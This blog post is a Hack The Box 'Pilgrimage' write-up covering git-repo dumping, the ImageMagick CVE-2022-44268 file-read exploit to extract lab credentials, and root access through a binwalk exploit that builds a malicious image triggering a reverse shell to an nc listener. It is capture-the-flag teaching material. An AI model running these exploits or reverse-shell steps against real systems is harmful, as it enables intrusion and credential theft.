---
layout: post
author: H4-L0
---


# HTB-Pilgrimage

![image](/images/Pasted image 20230705225802.png)


## Enumeration

### nmap

lets start with nmap scan.

```
$ sudo nmap -sS -p- pilgrimage
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-28 14:43 EDT
Nmap scan report for pilgrimage (10.10.11.219)
Host is up (0.054s latency).
rDNS record for 10.10.11.219: pilgrimage.htb
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

we found 2 services:
- `22` ssh-Service
- `80` werbserver
---

the webserver is serving a image resizing service. after uploading the image you will get a download link for the rezised version.

![image](/images/Pasted image 20230628204701.png)

### dirbusting

after checking for directories with `ffuf` we found a git repository.

```shell
$ ffuf -w `fzf-wordlist` -u http://pilgrimage/FUZZ

.git/HEAD               [Status: 200, Size: 23, Words: 2, Lines: 2, Duration: 42ms]
.hta                    [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 42ms]
.htaccess               [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 44ms]
.htpasswd               [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 46ms]
assets                  [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 39ms]
index.php               [Status: 200, Size: 7621, Words: 2051, Lines: 199, Duration: 40ms]
tmp                     [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 43ms]
```

we used `git-dumper` to dump the repo to our machine.

[git-dumper](https://github.com/arthaud/git-dumper)

```sh
$ python3 -m git-dumper http://pilgrimage.htb/.git/HEAD ./git-dump`
```

the dumped repo contains those files.

```shell
$ ls
assets  dashboard.php  index.php  login.php  logout.php  magick  register.php  vendor
```

### imageMagick

one of them is a *binary* called *magick*

```shell
$ ./magick --version
Version: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64 c243c9281:20220911 https://imagemagick.org
Copyright: (C) 1999 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5)
Delegates (built-in): bzlib djvu fontconfig freetype jbig jng jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
Compiler: gcc (7.5)
```

we checked the version and we found out the webserver is using *ImageMagick 7.1.0-49 beta* to resize the uploaded images.

![image](/images/Pasted image 20230628221556.png)

a quick search got use an exploit for this version of ImageMagick.

[CVE-2022-44268](https://github.com/voidz0r/CVE-2022-44268)

now we are able to read files. the next step was to find interesing files to read.
we read more source code of the dumped git repo and got something worth reading with the exploit.

*dashboard.php*

```php
...
function fetchImages() {
  $username = $_SESSION['user'];
  $db = new PDO('sqlite:/var/db/pilgrimage');
  $stmt = $db->prepare("SELECT * FROM images WHERE username = ?");
  $stmt->execute(array($username));
  $allImages = $stmt->fetchAll(\PDO::FETCH_ASSOC);
  return json_encode($allImages);
...
```

in the file *dashboard.php* a connection to a `sqlite` database is established.
with this path: `/var/db/pilgrimage`

so we generated the malicious image with  
`cargo run "/var/db/pilgrimage"

and uploaded the file through the website.
after downloading we needed to analyse the image with
`identify -verbose output.png`

you will see a very long hexcode that we saved as a binary file. because sqlite database files are binary files.

we did it with a small python script.

```python
hex_string = <long hex code>
with open("sqlite.db", "wb") as dbf:
    dbf.write(bytes.from(hex_string))
```

after that we could read the database file and found users and passwords. 

```sqlite
emily|abigchonkyboi123
vagos|123
asdasd|asdasd
emily@pilgrimage.htb|emily
```

and `emily` got us the *ssh* access.

```shell
emily@pilgrimage:~$ ls
user.txt
```

first thing after entering the system was grabbing the user flag under the home directory of `emily`

![image](/images/Pasted image 20230628222739.png)

## Privesc

as usual we checked common attack vectors and found a unusual binary. 
*binwalk* 

we checked the version number and we found that it is in dead vulnerable.

```shell
emily@pilgrimage:/usr/sbin$ /usr/local/bin/binwalk

Binwalk v2.3.2
Craig Heffner, ReFirmLabs
https://github.com/ReFirmLabs/binwalk
```

we got this exploit but we needed to find a way how root will execute it.

![image](/images/Pasted image 20230628222343.png)

so we monitored the running processes with [pspy](https://github.com/DominicBreuker/pspy)
and a few minutes later this popped up.

```shell
5333223_eifjlohkmpnqg.jpeg -resize 50% /var/www/pilgrimage.htb/shrunk/649c91959fbb2.jpeg
2023/06/29 06:01:25 CMD: UID=33    PID=58482  | /bin/bash /tmp/.mount_magick89qA8m/AppRun convert /var/www/pilgrimage.htb/tmp/649c91959fada8.35333223_eifjlohkmpnqg.jpeg -resize 50% /var/www/pilgrimage.htb/shrunk/649c91959fbb2.jpeg
2023/06/29 06:01:25 CMD: UID=0     PID=58483  | /bin/bash /usr/sbin/malwarescan.sh
2023/06/29 06:01:25 CMD: UID=0     PID=58486  | /bin/bash /usr/sbin/malwarescan.sh
2023/06/29 06:01:25 CMD: UID=0     PID=58485  | /bin/bash /usr/sbin/malwarescan.sh
2023/06/29 06:01:25 CMD: UID=0     PID=58484  | /bin/bash /usr/sbin/malwarescan.sh
2023/06/29 06:01:25 CMD: UID=0     PID=58487  | /bin/bash /usr/sbin/malwarescan.sh
```

root is executing a shell script called `malwarescan.sh`

```shell
emily@pilgrimage:/usr/sbin$ cat malwarescan.sh
```

we checked the content and found out it calls binwalk.

```bash
#!/bin/bash

blacklist=("Executable script" "Microsoft executable")

/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
        filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')"
        binout="$(/usr/local/bin/binwalk -e "$filename")"
        for banned in "${blacklist[@]}"; do
                if [[ "$binout" == *"$banned"* ]]; then
                        /usr/bin/rm "$filename"
                        break
                fi
        done
```

the script is triggered as soon a new file is recognized in the directory:
`/var/www/pilgrimage.htb/shrunk/`

we used the python [exploit](https://www.exploit-db.com/exploits/51249)with this arguments to create a new malicious image.

```shell
$ python3 walki.py CVE-2022-44268/image.png 10.10.10.10 4445
```

don't forget to start the listener because the image will trigger a reverse shell to our machine.

```shell
$ nc -lvnp 4445
listening on [any] 4445 ...
```

at last we started a python web server so we could download the image to the vulnerable directory.

```sh
$ python3 -m http.server 80
```

download the image with `wget`

```sh
$ wget http://10.10.10.10/explout_img.png
```

and we are root

```shell

connect to [10.10.14.155] from (UNKNOWN) [10.10.11.219] 56294
ls
_my.png.extracted
cd /root
ls
authorized_keys
quarantine
reset.sh
root.txt
cat root.txt
e5*********************3bcee6
```


here is the root flag!

[H4] & [L0]
